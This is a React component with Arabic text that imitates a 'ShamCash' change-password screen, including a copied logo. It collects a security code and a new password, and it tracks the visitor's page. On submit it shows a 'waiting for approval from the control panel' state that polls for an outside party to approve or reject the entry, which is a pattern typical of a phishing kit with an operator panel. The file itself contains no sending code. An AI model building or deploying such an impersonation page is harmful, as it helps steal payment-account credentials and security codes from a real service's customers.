import { useState, useRef, useEffect } from "react";
import { Lock, ShieldCheck, Eye, EyeOff, CheckCircle, XCircle } from "lucide-react";

function ShamLogo() {
  return (
    <div className="relative h-28 w-32">
      <div
        className="absolute left-5 top-12 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#5dd99f] via-[#44a984] to-[#257b6f] shadow-[0_18px_35px_rgba(20,219,144,0.12)]"
        style={{
          clipPath: "polygon(0 20%, 64% 0, 100% 27%, 37% 57%, 100% 86%, 100% 100%, 36% 71%, 0 50%)",
        }}
      />
      <div
        className="absolute left-14 top-5 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#6273dd] via-[#5365c3] to-[#354075] shadow-[0_22px_40px_rgba(99,116,212,0.18)]"
        style={{
          clipPath: "polygon(0 0, 100% 34%, 100% 100%, 35% 70%, 0 53%)",
        }}
      />
    </div>
  );
}

type Status = "idle" | "pending" | "approved" | "rejected";

export function ShamCashChangePassword() {
  const [showNew, setShowNew] = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);
  const [status, setStatus] = useState<Status>("idle");
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);

  function handleSubmit() {
    localStorage.setItem("sham_changepass_status", "pending");
    localStorage.setItem("sham_changepass_time", new Date().toLocaleTimeString("ar-SY"));
    setStatus("pending");

    intervalRef.current = setInterval(() => {
      const s = localStorage.getItem("sham_changepass_status") as Status | null;
      if (s && s !== "pending") {
        setStatus(s);
        if (intervalRef.current) clearInterval(intervalRef.current);
      }
    }, 500);
  }

  useEffect(() => {
    localStorage.removeItem("sham_changepass_status");
    localStorage.setItem("sham_visitor_page", "تغيير كلمة المرور");
    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, []);

  if (status === "approved") {
    return (
      <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir="rtl">
        <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
        <div className="pointer-events-none absolute -right-28 bottom-20 h-80 w-80 rounded-full bg-[#1fc28a]/5 blur-3xl" />
        <div className="mx-auto flex min-h-screen max-w-[390px] flex-col items-center justify-center px-6 text-center space-y-5">
          <CheckCircle className="h-20 w-20 text-[#1fc28a]" strokeWidth={1.5} />
          <h2 className="text-[24px] font-extrabold text-white/90">تم تغيير كلمة المرور</h2>
          <p className="text-[14px] font-semibold text-[#c9ccdb]/60 leading-relaxed">
            تم تحديث كلمة المرور بنجاح.<br />يمكنك الآن تسجيل الدخول.
          </p>
          <button
            type="button"
            onClick={() => { window.location.href = "/"; }}
            className="mt-4 h-[58px] w-full rounded-[15px] bg-[#657bd8] text-[18px] font-extrabold text-white shadow-[0_16px_35px_rgba(101,123,216,0.22)] hover:bg-[#7089e0] transition-colors active:scale-[0.98]"
          >
            تسجيل الدخول
          </button>
        </div>
      </div>
    );
  }

  if (status === "rejected") {
    return (
      <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir="rtl">
        <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
        <div className="mx-auto flex min-h-screen max-w-[390px] flex-col items-center justify-center px-6 text-center space-y-5">
          <XCircle className="h-20 w-20 text-[#e54343]" strokeWidth={1.5} />
          <h2 className="text-[24px] font-extrabold text-[#e54343]">تم رفض الطلب</h2>
          <p className="text-[14px] font-semibold text-[#c9ccdb]/60 leading-relaxed">
            لم يتم تغيير كلمة المرور.<br />يرجى المحاولة مجدداً.
          </p>
          <button
            type="button"
            onClick={() => {
              setStatus("idle");
              localStorage.removeItem("sham_changepass_status");
            }}
            className="mt-4 h-[58px] w-full rounded-[15px] bg-[#2a3047] text-[18px] font-bold text-white/80 hover:bg-[#333d5c] transition-colors"
          >
            المحاولة مجدداً
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir="rtl">
      <div className="relative mx-auto flex min-h-screen w-full max-w-[390px] flex-col px-4 pb-7 pt-4 font-['Inter']">
        <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
        <div className="pointer-events-none absolute -right-28 bottom-20 h-80 w-80 rounded-full bg-[#1fc28a]/5 blur-3xl" />

        <div className="relative flex items-center pt-2">
          <button
            type="button"
            onClick={() => { window.location.href = "/"; }}
            className="flex items-center gap-1.5 text-[14px] font-bold text-white/50 hover:text-white/80 transition-colors"
          >
            <svg viewBox="0 0 24 24" fill="none" className="h-4 w-4">
              <path d="M15 19l-7-7 7-7" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
            رجوع
          </button>
        </div>

        <div className="relative flex justify-center pb-4 pt-4">
          <ShamLogo />
        </div>

        <div className="relative space-y-5">
          <div className="space-y-1">
            <h1 className="text-right text-[27px] font-extrabold tracking-[-0.02em] text-white/90">
              تغيير كلمة المرور
            </h1>
            <p className="text-right text-[14px] font-semibold text-[#c9ccdb]/60 leading-relaxed">
              ادخل كلمة السر الجديدة و رمز الأمان الخاص بك
            </p>
          </div>

          <div className="space-y-4 pt-1">
            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
              <div className="text-white/60"><ShieldCheck className="h-5 w-5" /></div>
              <input
                type="text"
                placeholder="رمز الأمان"
                disabled={status === "pending"}
                className="min-w-0 flex-1 bg-transparent text-right text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50"
                dir="rtl"
              />
            </div>

            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
              <div className="text-white/60"><Lock className="h-5 w-5" /></div>
              <input
                type={showNew ? "text" : "password"}
                placeholder="كلمة المرور الجديدة"
                disabled={status === "pending"}
                className="min-w-0 flex-1 bg-transparent text-right text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50"
                dir="rtl"
              />
              <button type="button" onClick={() => setShowNew(!showNew)} className="text-white/60 hover:text-white/90 transition-colors">
                {showNew ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
            </div>

            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
              <div className="text-white/60"><Lock className="h-5 w-5" /></div>
              <input
                type={showConfirm ? "text" : "password"}
                placeholder="تأكيد كلمة المرور"
                disabled={status === "pending"}
                className="min-w-0 flex-1 bg-transparent text-right text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50"
                dir="rtl"
              />
              <button type="button" onClick={() => setShowConfirm(!showConfirm)} className="text-white/60 hover:text-white/90 transition-colors">
                {showConfirm ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
            </div>
          </div>

          {status === "pending" && (
            <p className="text-center text-[14px] font-semibold text-[#c9ccdb]/60 flex items-center justify-center gap-2">
              <svg className="h-4 w-4 animate-spin text-[#657bd8]" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeOpacity="0.25" />
                <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round" />
              </svg>
              في انتظار الموافقة من لوحة التحكم...
            </p>
          )}

          <div className="pt-1">
            <button
              type="button"
              onClick={status === "idle" ? handleSubmit : undefined}
              disabled={status === "pending"}
              className={`w-full h-[58px] rounded-[15px] text-[20px] font-extrabold text-white shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-all flex items-center justify-center gap-3
                ${status === "pending"
                  ? "bg-[#657bd8]/60 cursor-not-allowed"
                  : "bg-[#657bd8] hover:bg-[#7089e0] active:scale-[0.98]"
                }`}
            >
              {status === "pending" ? (
                <>
                  <svg className="h-5 w-5 animate-spin" viewBox="0 0 24 24" fill="none">
                    <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="3" strokeOpacity="0.3" />
                    <path d="M12 2a10 10 0 0 1 10 10" stroke="white" strokeWidth="3" strokeLinecap="round" />
                  </svg>
                  جارٍ الانتظار...
                </>
              ) : (
                "تغيير كلمة المرور"
              )}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default ShamCashChangePassword;
